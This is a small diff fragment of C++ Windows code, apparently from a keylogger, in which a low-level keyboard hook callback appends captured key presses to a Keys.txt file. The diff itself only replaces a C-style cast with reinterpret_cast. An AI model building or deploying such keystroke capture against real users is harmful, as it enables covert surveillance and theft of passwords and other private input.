@@ -16,7 +16,7 @@ std::ofstream logfile("../output/Keys.txt", std::ios::app);
 // TODO: Better keystrokes such as determine whether it is capital
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
-        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
+        auto* p = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
         DWORD vkCode = p->vkCode;
 
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
